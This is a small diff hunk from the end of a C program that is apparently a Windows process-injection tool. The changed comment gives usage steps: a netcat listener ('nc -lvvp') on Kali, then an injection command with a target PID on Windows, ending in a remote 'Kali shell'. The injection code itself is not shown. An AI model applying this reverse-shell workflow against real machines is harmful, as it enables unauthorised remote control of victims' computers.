@@ -19,6 +19,6 @@ int main(int argc, char *argv[]) {
 }
 
 /* Kali "nc -lvvp "port from payload"
-   Win "Injecting to PID process: №PID" 
+   Win cmd "injection_process №PID" -> ENTER 
    
    Kali shell :-) */
